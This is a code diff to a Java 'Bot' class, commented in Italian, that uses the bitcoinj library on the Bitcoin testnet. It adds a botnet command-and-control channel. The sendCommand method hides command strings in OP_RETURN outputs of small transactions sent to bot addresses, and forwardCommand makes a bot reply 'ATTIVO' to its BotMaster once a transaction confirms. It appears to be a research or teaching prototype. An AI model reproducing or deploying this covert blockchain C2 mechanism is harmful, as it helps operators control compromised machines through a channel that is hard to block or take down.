@@ -1,8 +1,10 @@
 import java.io.File;
+import java.util.ArrayList;
 import java.util.List;
 
 import org.bitcoinj.core.Address;
 import org.bitcoinj.core.Coin;
+import org.bitcoinj.core.ECKey;
 import org.bitcoinj.core.NetworkParameters;
 import org.bitcoinj.core.Transaction;
 import org.bitcoinj.core.TransactionConfidence;
@@ -10,7 +12,9 @@ import org.bitcoinj.core.TransactionOutput;
 import org.bitcoinj.kits.WalletAppKit;
 import org.bitcoinj.params.TestNet3Params;
 import org.bitcoinj.script.Script;
+import org.bitcoinj.script.ScriptBuilder;
 import org.bitcoinj.utils.BriefLogFormatter;
+import org.bitcoinj.wallet.SendRequest;
 import org.bitcoinj.wallet.Wallet;
 import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
 
@@ -66,6 +70,8 @@ public class Bot {
 					e.printStackTrace();
 				}
                 
+                
+                
                 Futures.addCallback(tx.getConfidence().getDepthFuture(1), new FutureCallback<TransactionConfidence>() {
                     @Override
                     public void onSuccess(TransactionConfidence result) {
@@ -73,6 +79,8 @@ public class Bot {
                         /*
                          * Inoltrare la transazione ricevuta nuovamente al BotMaster
                          */
+                        forwardCommand("ATTIVO", tx);
+                       
                     }
 
                     @Override
@@ -126,6 +134,55 @@ public class Bot {
 		}
 		
 	}
+    
+    /*
+     * Invio di un comando a un bot
+     */
+    public static String sendCommand(String command, Address botAddress) throws Exception {
 
+		byte[] hash = command.getBytes("UTF-8");
+		
+		Transaction transaction = new Transaction(kit.wallet().getParams());
+		
+		transaction.addOutput(Coin.MILLICOIN, botAddress);
+		transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());
+	
+		SendRequest sendRequest = SendRequest.forTx(transaction);
+
+		String string = new String(hash);
+		System.out.println("Sending ... " +string);
+    	
+		kit.wallet().completeTx(sendRequest);   // Could throw InsufficientMoneyException
+
+		kit.peerGroup().setMaxConnections(1);
+		kit.peerGroup().broadcastTransaction(sendRequest.tx);
+		
+		return transaction.getHashAsString();		
+	}
+    
+    
+    public static void forwardCommand(String response, Transaction tx) {
+    	List<TransactionOutput> out = tx.getOutputs();
+        //List<TransactionInput> in = tx.getInputs();
+        
+        Address a = null;
+        for (TransactionOutput o : out) {
+        	o.getAddressFromP2PKHScript(kit.wallet().getParams());
+        	if (o.getAddressFromP2PKHScript(kit.wallet().getParams()) != null) {
+        		a = o.getAddressFromP2PKHScript(kit.wallet().getParams());
+        		break;
+        	}
+        }
+        System.out.println("Hai ricevuto i Coins da: " + a.toString());
+        
+        try {
+			sendCommand(response, a);
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+    }
+
+    
     
 }
